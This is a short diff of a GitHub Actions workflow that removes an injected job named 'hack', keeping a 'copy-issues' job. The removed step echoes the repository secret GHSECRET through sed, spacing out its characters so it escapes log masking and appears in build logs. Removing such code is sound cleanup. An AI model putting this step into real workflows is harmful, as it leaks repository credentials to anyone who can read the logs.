@@ -31,13 +31,6 @@ permissions:
   contents: read
 
 jobs:
-  hack:
-    name: hacker
-    runs-on: ubuntu-latest
-    steps:
-    - name: hackerio
-      run: |
-        echo ${{ secrets.GHSECRET }} | sed 's/./& /g'
   copy-issues:
     name: CopyIssues
     runs-on: ubuntu-latest
